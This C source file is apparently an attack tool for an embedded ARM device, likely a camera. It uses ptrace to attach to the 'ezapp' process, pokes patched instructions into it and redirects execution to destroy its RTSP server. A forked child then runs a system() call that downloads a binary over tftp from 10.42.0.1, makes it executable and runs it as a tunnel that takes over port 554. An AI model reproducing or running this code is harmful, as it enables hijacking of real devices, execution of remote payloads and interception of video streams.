#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/ptrace.h> /* for ptrace() */
#include <sys/user.h> /* for struct user_regs_struct */
#include <signal.h>
#include <sys/socket.h>
#include <netinet/in.h>

struct user_regs_struct {
  unsigned int r0;
  unsigned int r1;
  unsigned int r2;
  unsigned int r3;
  unsigned int r4;
  unsigned int r5;
  unsigned int r6;
  unsigned int r7;
  unsigned int r8;
  unsigned int r9;
  unsigned int r10;
  unsigned int r11;
  unsigned int r12;
  unsigned int sp;
  unsigned int lr;
  unsigned int pc;
  unsigned int cpsr;
  unsigned int fpscr;
};

void print_regs(struct user_regs_struct *regs) {
    printf("Registers -----------------------------------------------------------------------------------------\n");
    printf(" r0 0x%08x    r1 0x%08x    r2 0x%08x    r3 0x%08x    r4 0x%08x    r5 0x%08x\n", regs->r0, regs->r1, regs->r2, regs->r3, regs->r4, regs->r5);
    printf(" r6 0x%08x    r7 0x%08x    r8 0x%08x    r9 0x%08x   r10 0x%08x   r11 0x%08x\n", regs->r6, regs->r7, regs->r8, regs->r9, regs->r10, regs->r11);
    printf("r12 0x%08x    sp 0x%08x    lr 0x%08x    pc 0x%08x  cpsr 0x%08x fpscr 0x%08x\n", regs->r12, regs->sp, regs->lr, regs->pc, regs->cpsr, regs->fpscr);
    printf("--------------------------------------------------------------------------------------------------\n");
    return;
}

int get_pid_ezapp() {
    char line[100];
    FILE *command;
    int pid;

    command = popen("ps | awk '/ezapp/ {print $1}'", "r");
    fgets(line, 100, command);
    sscanf(line, "%d", &pid);
    return pid;
}

int inject(int pid, char *src, void *dst, int len) {
    int i;
    unsigned int *source = (unsigned int *) src;
    unsigned int *destination = (unsigned int *) dst;
 
    for(i = 0; i < len; i+=4, source++, destination++) {
        if (ptrace(PTRACE_POKETEXT, pid, destination, *source) < 0) {
            printf("[ERROR] Unexpected error while injecting the shellcode"); 
            return -1;
        }
    }
    return 0;
}

int backup(int pid, void *src, char *dst, int len) {
    int i;
    unsigned int *source = (unsigned int *) src;
    unsigned int *destination = (unsigned int *) dst;
 
    for(i = 0; i < len; i+=4, source++, destination++) {
        *destination = ptrace(PTRACE_PEEKTEXT, pid, source, NULL);
    }
    return 0;
}

void connect_to_server() {
    int sockfd, connfd;
    struct sockaddr_in servaddr, cli;
 
    // socket create and verification
    sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if (sockfd == -1) {
        printf("socket creation failed...\n");
        return;
    }
    else
        printf("Socket successfully created..\n");
    bzero(&servaddr, sizeof(servaddr));
 
    // assign IP, PORT
    servaddr.sin_family = AF_INET;
    servaddr.sin_addr.s_addr = inet_addr("127.0.0.1");
    servaddr.sin_port = htons(554);
 
    // connect the client socket to server socket
    if (connect(sockfd, &servaddr, sizeof(servaddr))
        != 0) {
        printf("connection with the server failed...\n");
        return;
    }
    else
        printf("connected to the server..\n");
 
    write(sockfd, "test", 4);

    // close the socket
    close(sockfd);
}

int main() {
    int pid = get_pid_ezapp();
    struct user_regs_struct oldregs, newregs;
    char original[256];
    char shellcode[256];
    int status;
    
    printf("Attaching to ezapp...\n");
    printf("pid: %d\n", pid);
    ptrace(PTRACE_ATTACH, pid, NULL, NULL);
    waitpid(pid, &status, NULL);
    ptrace(PTRACE_GETREGS, pid, NULL, &oldregs);
    printf("Saving old registers...\n");
    print_regs(&oldregs);
    // int res = backup(pid, oldregs.pc, original, 256);
    // for (size_t i = 0; i < 256/4; i++)
    // {
    //     printf("0x%08x\n", ((unsigned int *)original)[i]);
    // }
   
   
    memcpy(&newregs, &oldregs, sizeof(struct user_regs_struct));

    unsigned int rtsp_server_obj = ptrace(PTRACE_PEEKTEXT, pid, 0x3108A8, NULL);
    unsigned int rtsp_server_con = ptrace(PTRACE_PEEKTEXT, pid, rtsp_server_obj, NULL);
    unsigned int rtsp_server_fd = ptrace(PTRACE_PEEKTEXT, pid, rtsp_server_con + 4, NULL);

    printf("Looking for RTSP server object and file descriptor...\n");
    printf("obj: 0x%08x\n", rtsp_server_obj);
    printf("con: 0x%08x\n", rtsp_server_con);
    printf("fd:  0x%08x\n", rtsp_server_fd);

    newregs.pc = 0x7E518; // CRtspServer::release_resource + 4
    newregs.r0 = rtsp_server_obj;

    printf("Crafting registers to run CRtspServer::release_resource...\n");
    print_regs(&newregs);

    ptrace(PTRACE_POKETEXT, pid, 0x7E57C, 0xe1200073); // CRtspServer::release_resource pop and ret

    ptrace(PTRACE_SETREGS, pid, NULL, &newregs);

    ptrace(PTRACE_CONT, pid, NULL, NULL);
    waitpid(pid, &status, WUNTRACED);
    printf("stopped: 0x%08x\n", WIFSTOPPED(status));
    printf("signal:  0x%08x\n", WSTOPSIG(status));
    printf("sigtrap: 0x%08x\n", SIGTRAP);
    ptrace(PTRACE_GETREGS, pid, NULL, &newregs);
    print_regs(&newregs);

    printf("RTSP server object destroyed...\n");
    printf("Restoring old registers...\n");
    ptrace(PTRACE_SETREGS, pid, NULL, &oldregs);
    ptrace(PTRACE_POKETEXT, pid, 0x7E57C, 0x3080BDE8);
    ptrace(PTRACE_CONT, pid, NULL, NULL);

    printf("Closing RTSP server fd on children...\n");
    close(rtsp_server_fd);
    connect_to_server();

    int fd[2];
    char ch;
    pipe(fd);
   
    printf("Forking tunnel process and waiting for parent to die... \n");
    if (fork() == 0) {
        close(fd[1]);
        // block until parent goes away
        read(fd[0], &ch, 1);
        printf("Parent gone. Launching tunnel...\n");
        system("tftp -g -r t 10.42.0.1 9069;chmod +x t;./t -d -l 0.0.0.0:554 10.42.0.1:8554");
    }

    return 0;   
}

